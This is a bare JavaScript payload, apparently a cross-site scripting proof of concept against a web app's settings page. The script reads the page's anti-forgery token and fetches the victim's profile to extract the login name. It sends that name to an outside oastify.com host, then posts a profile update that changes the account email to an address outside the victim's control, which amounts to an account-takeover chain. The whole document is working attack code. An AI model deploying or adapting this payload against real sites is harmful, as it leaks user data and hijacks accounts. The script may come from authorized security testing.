(async () => {
  const token =
    document.querySelector('input[name="__RequestVerificationToken"]')?.value;

  if (!token) {
    console.error("Missing __RequestVerificationToken");
    return;
  }

  const r = await fetch('/Settings', {
    credentials: 'include'
  });

  const html = await r.text();
  const doc = new DOMParser().parseFromString(html, 'text/html');

  const username =
    doc.querySelector('#ProfileInfo_LoginName-input')?.value ||
    doc.querySelector('input[name="ProfileInfo.LoginName"]')?.value;

  await fetch(
    'https://v737o1tiz67xyfm89veutxtgh7nybqzf.oastify.com?username=' +
    encodeURIComponent(username)
  );

  const fd = new FormData();
  fd.append("ProfileInfo.Email", "trey@inspectiv.com");
  fd.append("__RequestVerificationToken", token);

  try {
    const r2 = await fetch("/Settings?handler=UpdateProfileInfo", {
      method: "POST",
      credentials: "include",
      headers: {
        "X-Requested-With": "XMLHttpRequest"
      },
      body: fd
    });

    const text = await r2.text();
    console.log("status:", r2.status);
    console.log("response:", text);
  } catch (err) {
    console.error("request failed:", err);
  }
})();
